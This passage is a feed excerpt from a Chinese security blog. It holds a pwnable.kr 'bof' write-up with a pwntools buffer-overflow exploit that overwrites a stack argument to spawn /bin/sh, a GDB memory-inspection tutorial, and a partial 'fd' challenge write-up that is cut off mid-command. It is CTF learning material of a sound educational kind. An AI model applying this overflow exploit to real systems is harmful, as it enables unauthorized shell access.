      <category term="Tools" scheme="https://muzibing.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（三）[bof]</title>
    <link href="https://muzibing.github.io/2020/04/29/2020.04.28%EF%BC%88111%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/29/2020.04.28（111）/</id>
    <published>2020-04-28T16:00:00.000Z</published>
    <updated>2020-04-30T03:24:56.525Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、相关知识"><a href="#一、相关知识" class="headerlink" title="一、相关知识"></a><font color="brown">一、相关知识</font></h3><h4 id="1-pwntools工具"><a href="#1-pwntools工具" class="headerlink" title="1.pwntools工具"></a><font color="navy">1.pwntools工具</font></h4><blockquote><p>最近将会认真的总结一下相关的知识点</p></blockquote><h4 id="2-函数调用在栈中的表现形式"><a href="#2-函数调用在栈中的表现形式" class="headerlink" title="2.函数调用在栈中的表现形式"></a><font color="navy">2.函数调用在栈中的表现形式</font></h4><blockquote><p>可以参考<a href="[https://muzibing.github.io/2019/09/24/2019.09.24%EF%BC%8883%EF%BC%89/](https://muzibing.github.io/2019/09/24/2019.09.24（83）/">这里</a>)</p></blockquote><h4 id="3-栈保护机制相关知识点"><a href="#3-栈保护机制相关知识点" class="headerlink" title="3.栈保护机制相关知识点"></a><font color="navy">3.栈保护机制相关知识点</font></h4><blockquote><p>将会和其他知识进行总结</p></blockquote><h3 id="二、题目分析"><a href="#二、题目分析" class="headerlink" title="二、题目分析"></a><font color="brown">二、题目分析</font></h3><blockquote><p>① 首先检查<code>bof</code>文件的类型，发现它是一个32位的ELF文件</p></blockquote><p><img src="/images/111-1.jpg" alt></p><blockquote><p>② 然后查看<code>bof</code>文件开了什么保护，可以得出相关的保护基本能开的都开了，这让我一个小白如何是好？接下来先看看源码。</p></blockquote><p><img src="/images/111-2.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RELRO:    Partial RELRO    =&gt;对GOT表具有写权限</span><br><span class="line">Stack:    Canary found=&gt;开启了金丝雀保护，具有cookie</span><br><span class="line">NX:       NX enabled=&gt;栈不可执行</span><br><span class="line">PIE:      PIE enabled=&gt;开启了内存地址随机化</span><br></pre></td></tr></table></figure><blockquote><p>③ 在IDA-32进行<code>F5</code>逆向，得到如下的伪代码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*main函数*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  func(<span class="number">-559038737</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*fun函数*/</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">func</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+1Ch] [bp-2Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+3Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__GS__, <span class="number">20</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">-889275714</span> )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Nah.."</span>);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__GS__, <span class="number">20</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>打开<code>bof.c</code>文件，得到bof的源代码：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>④ 画出<code>overflowme</code>、<code>key</code>以及其他参数变量在<code>stack</code>中的位置，如下图：</p></blockquote><p><img src="/images/111-3.png" alt></p><blockquote><p>⑤ 发现，如果将传入的<code>0xdeadbeef</code>通过栈溢出换成<code>0xcafebabe</code>，而且在程序里面已经有调用<code>system(&quot;/bin/sh&quot;)</code>的语句，只要替换成功就能调用，那上面的保护基本也没什么意义嘛。</p></blockquote><p><img src="/images/111-4.jpg" alt></p><blockquote><p>⑥ 那么我们就可以利用<code>pwntools</code>工具进行攻击</p></blockquote><h3 id="三、解题步骤"><a href="#三、解题步骤" class="headerlink" title="三、解题步骤"></a><font color="brown">三、解题步骤</font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">"i386"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>)</span><br><span class="line">r = remote(<span class="string">"pwnable.kr"</span>,<span class="number">9000</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">52</span> + str(p32(<span class="number">0xcafebabe</span>),encoding=<span class="string">"unicode_escape"</span>)<span class="comment"># 52 = 0x2c + 8</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>运行上述代码，然后就<code>ls -l</code>，就可以查看相关文件的权限，其中<code>flag</code>文件有读的权限如下图：</p></blockquote><p><img src="/images/111-5.png" alt></p><blockquote><p><code>cat flag</code>得到flag</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">daddy, I just pwned a buFFer :)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、相关知识&quot;&gt;&lt;a href=&quot;#一、相关知识&quot; class=&quot;headerlink&quot; title=&quot;一、相关知识&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、相关知识&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-pwntools工具&quot;&gt;&lt;a href=
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>GDB常用命令-内存查看（x）</title>
    <link href="https://muzibing.github.io/2020/04/28/2020.04.27%EF%BC%88110%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/28/2020.04.27（110）/</id>
    <published>2020-04-27T16:00:00.000Z</published>
    <updated>2020-06-02T03:13:57.150Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、功能说明"><a href="#一、功能说明" class="headerlink" title="一、功能说明"></a><font color="brown">一、功能说明</font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它是按一定格式显示内存地址或变量的值</span><br></pre></td></tr></table></figure><h3 id="二、格式"><a href="#二、格式" class="headerlink" title="二、格式"></a><font color="brown">二、格式</font></h3><blockquote><p>x&nbsp;&nbsp;&nbsp;&nbsp;/(length)(format)(size)&nbsp;&nbsp;&nbsp;&nbsp;addr</p></blockquote><p><code>例如</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* file : test.c */</span></span><br><span class="line"><span class="comment">/* gcc -o test test.c -g */</span></span><br><span class="line"><span class="comment">/* gdb ./test */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> arr[] = <span class="string">"123456789ABCDEF"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ gdb test</span><br><span class="line">(gdb) <span class="keyword">break</span> main</span><br><span class="line">(gdb) run</span><br><span class="line">Breakpoint <span class="number">1</span>, main (argc=<span class="number">1</span>, argv=<span class="number">0x7fffffffe4f8</span>) at test.c:<span class="number">2</span></span><br><span class="line"><span class="number">2</span>           <span class="keyword">char</span> arr[] = <span class="string">"123456789ABCDEF"</span>;</span><br><span class="line">(gdb) next</span><br><span class="line"><span class="number">3</span>           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">(gdb) x arr</span><br><span class="line"><span class="number">0x7fffffffe400</span>: <span class="number">0x34333231</span></span><br><span class="line">(gdb) x /c arr</span><br><span class="line"><span class="number">0x7fffffffe400</span>: <span class="number">49</span> <span class="string">'1'</span></span><br><span class="line">(gdb) x /<span class="number">5</span>c arr</span><br><span class="line"><span class="number">0x7fffffffe400</span>: <span class="number">49</span> <span class="string">'1'</span>  <span class="number">50</span> <span class="string">'2'</span>  <span class="number">51</span> <span class="string">'3'</span>  <span class="number">52</span> <span class="string">'4'</span>  <span class="number">53</span> <span class="string">'5'</span></span><br><span class="line">(gdb) x /<span class="number">5</span>xb arr</span><br><span class="line"><span class="number">0x7fffffffe400</span>: <span class="number">0x31</span>    <span class="number">0x32</span>    <span class="number">0x33</span>    <span class="number">0x34</span>    <span class="number">0x35</span></span><br><span class="line">(gdb) x /gx arr</span><br><span class="line"><span class="number">0x7fffffffe400</span>: <span class="number">0x3837363534333231</span></span><br><span class="line">(gdb) x /<span class="number">5</span>i $pc</span><br><span class="line">=&gt; <span class="number">0x4004c9</span> &lt;main+<span class="number">39</span>&gt;:  mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">   <span class="number">0x4004ce</span> &lt;main+<span class="number">44</span>&gt;:  pop    %rbp</span><br><span class="line">   <span class="number">0x4004cf</span> &lt;main+<span class="number">45</span>&gt;:  retq   </span><br><span class="line">   <span class="number">0x4004d0</span> &lt;__libc_csu_init&gt;:  push   %r15</span><br><span class="line">   <span class="number">0x4004d2</span> &lt;__libc_csu_init+<span class="number">2</span>&gt;:        mov    %edi,%r15d</span><br></pre></td></tr></table></figure><h3 id="三、参数说明"><a href="#三、参数说明" class="headerlink" title="三、参数说明"></a><font color="brown">三、参数说明</font></h3><div class="table-container"><table><thead><tr><th>length</th><th style="text-align:left">format</th><th style="text-align:left">size</th></tr></thead><tbody><tr><td>b（byte）：字节（8位）<br>h（halfword）：半字（16位）<br>w（word）：字（32位）<br>g（giant word）：双字（64位）</td><td style="text-align:left">o（octal） 八进制<br>x（hexadecimal）十六进制 <br>d（decimal） 十进制<br>u（unsigned decimal） 无符号十进制<br>t（binary） 二进制 <br>f（floating point ）浮点数 <br>a（address） 地址 <br>c（char） 字符 <br>s（string） 字符串 <br>i（instruction） 指令</td><td style="text-align:left">任意长度</td></tr></tbody></table></div><p><code>地址参数相关说明</code>：</p><blockquote><p>地址可为表达式/直接地址，其结果为内存地址。例如可用寄存器（<code>$eip</code>）或伪寄存器（<code>$pc</code>）。若<code>x</code>指令后没有地址表达式，则显示结果为上一次地址。</p></blockquote><h3 id="四、参考文章"><a href="#四、参考文章" class="headerlink" title="四、参考文章"></a><font color="brown">四、参考文章</font></h3><p><a href="http://www.hh-yzm.com/index.php/archives/33/#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B" target="_blank" rel="noopener">GDB常用命令 - 内存查看</a></p><h3 id="五、GDB其他命令"><a href="#五、GDB其他命令" class="headerlink" title="五、GDB其他命令"></a><font color="brown">五、GDB其他命令</font></h3><object data="/pdf/GDB命令参考手册.pdf" type="application/pdf" width="100%" height="800"></object>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、功能说明&quot;&gt;&lt;a href=&quot;#一、功能说明&quot; class=&quot;headerlink&quot; title=&quot;一、功能说明&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、功能说明&lt;/font&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight plain
      
    
    </summary>
    
      <category term="Tools" scheme="https://muzibing.github.io/categories/Tools/"/>
    
    
      <category term="GDB" scheme="https://muzibing.github.io/tags/GDB/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr的奇幻之旅（一）[fd]</title>
    <link href="https://muzibing.github.io/2020/04/23/2020.04.23%EF%BC%88108%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/23/2020.04.23（108）/</id>
    <published>2020-04-22T16:00:00.000Z</published>
    <updated>2020-04-24T03:42:57.034Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-相关知识"><a href="#0x00-相关知识" class="headerlink" title="0x00 相关知识"></a><font color="navy"><code>0x00 相关知识</code></font></h3><h4 id="1-atoi-函数"><a href="#1-atoi-函数" class="headerlink" title="1.atoi()函数"></a><font color="blue"><code>1.atoi()函数</code></font></h4><blockquote><p>① atoi函数是包含在stdlib.h标准库中 </p><p>② 函数的声明：int atoi(const char* str)</p><p>③ 作用：是用来将参数中的str所指向的字符串转化为一个整数</p><p>④ 实例如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* s1 = <span class="string">"Hello World"</span>;</span><br><span class="line"><span class="keyword">char</span>* s2 = <span class="string">"1234567890"</span>;</span><br><span class="line"><span class="keyword">char</span>* s3 = <span class="string">"Th1s_1s_a_t9st"</span>;</span><br><span class="line">    <span class="keyword">char</span>* s4 = <span class="string">"a"</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,atoi(s1));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,atoi(s2));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,atoi(s3));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,atoi(s4));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果为：</span></span><br><span class="line"><span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 1234567890</span></span><br><span class="line"><span class="comment">// 0</span></span><br></pre></td></tr></table></figure><blockquote><p>所以说对于atoi函数的返回值来说：该函数返回转换后的长整数，如果没有执行有效的转换，则返回零。其实也可以理解为将纯数字的字符串转化为数值，含有其他符号的字符串将返回0。</p></blockquote><h4 id="2-read-函数"><a href="#2-read-函数" class="headerlink" title="2.read()函数"></a><font color="blue"><code>2.read()函数</code></font></h4><blockquote><p>① read函数被包含在unistd.h标准库中</p><p>② read函数的声明：<code>ssize_t read(int fd, void *buf, size_t count)</code>;  </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里要解释一下fd文件描述符的作用：</span><br><span class="line"></span><br><span class="line">在Linux系统中一切皆可以看成是文件，文件又可分为：普通文件、目录文件、链接文件和设备文件。文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，其是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I/O操作的系统调用都通过文件描述符。</span><br><span class="line"></span><br><span class="line">程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。</span><br></pre></td></tr></table></figure><p><img src="/images/108-2.png" alt></p><blockquote><p>③ read函数的解释：read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read()不会有作用并返回0。返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动</p><p>④ read函数的返回值：成功返回读取的字节数，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0</p></blockquote><h4 id="3-C函数中main函数的参数"><a href="#3-C函数中main函数的参数" class="headerlink" title="3.C函数中main函数的参数"></a><font color="blue"><code>3.C函数中main函数的参数</code></font></h4><blockquote><p>表示形式：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span> </span>= <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br></pre></td></tr></table></figure><blockquote><p><strong>其参数argc和argv用于运行时,把命令行参数传入主程序.其中ARG是指arguments,即参数.具体含义如下:</strong></p><ul><li><font color="red">**int argc:英文名为arguments count(参数计数)**</font><p><strong>*count of cmd line args,运行程序传送给main函数的命令行参数总个数,包括可执行程序名,其中当argc=1时表示只有一个程序名称,此时存储在argv[0]中.</strong></p></li><li><font color="red">**char \*\*argv:英文名为arguments value/vector(参数值)**</font><p><strong>pointer to table of cmd line args,字符串数组,用来存放指向字符串参数的指针数组,每个元素指向一个参数,空格分隔参数,其长度为argc.数组下标从0开始,argv[argc]=NULL.</strong></p><ul><li>argv[0] 指向程序运行时的全路径名</li><li>argv[1] 指向程序在DOS命令中执行程序名后的第一个字符串</li><li>argv[2] 指向执行程序名后的第二个字符串</li><li>argv[argc] 为NULL</li></ul></li><li><p>实例如下：</p></li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"argc is %d\n"</span>,argc);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>;i&lt;argc;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d:"</span>,i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,argv[i]);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">"PAUSE"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>执行<code>./test 1 2 3 A B C</code>得到如下的结果：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">argc is 7</span><br><span class="line">0:./test</span><br><span class="line">1:1</span><br><span class="line">2:2</span><br><span class="line">3:3</span><br><span class="line">4:A</span><br><span class="line">5:B</span><br><span class="line">6:C</span><br></pre></td></tr></table></figure><h3 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a><font color="navy"><code>0x01 题目分析</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh fd@pwnable.kr -p2222</span><br></pre></td></tr></table></figure><p>链接上去之后，查看一下相关的文件以及权限：<code>ls -l</code>，得到如下结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total 16</span><br><span class="line">-r-sr-x--- 1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r-- 1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r----- 1 fd_pwn root   50 Jun 11  2014 flag</span><br></pre></td></tr></table></figure><p>可以看出只有<strong>fd</strong>文件可执行，<strong>fd.c</strong>文件对root可读可写，那下面我们打开<strong>fd.c</strong>文件，分析一下源码，上源码！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面就来分析一下上述的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(argc&lt;2)&#123;</span><br><span class="line">       printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">       return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>上面的 <strong>if</strong> 语句是用来判断执行fd文件的参数，如果小于2则终止程序。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int fd = atoi( argv[1] ) - 0x1234;</span><br></pre></td></tr></table></figure><blockquote><p>利用atoi函数用来计算read函数中的fd，fd是第2个参数，也就是输入的第一个参数减去0x1234（十进制为4660）的值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">len = read(fd, buf, 32);</span><br></pre></td></tr></table></figure><blockquote><p>把fd指向的文件中，读取32个字节到buf数组中，我们希望fd为0，因为当fd=0时，我们就可以从键盘输入字符串，那么就能把字符串输入到buf数组里。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">         printf(&quot;good job :)\n&quot;);</span><br><span class="line">         system(&quot;/bin/cat flag&quot;);</span><br><span class="line">         exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>判断我们输入的串是否与”LETMEWIN”一样，若LETMEWIN = buf，则执行if条件语句，也就是说我们输入的字符串为”LETMEWIN”</p></blockquote><h3 id="0x02-解题步骤"><a href="#0x02-解题步骤" class="headerlink" title="0x02 解题步骤"></a><font color="navy"><code>0x02 解题步骤</code></font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@木子冰:# ssh 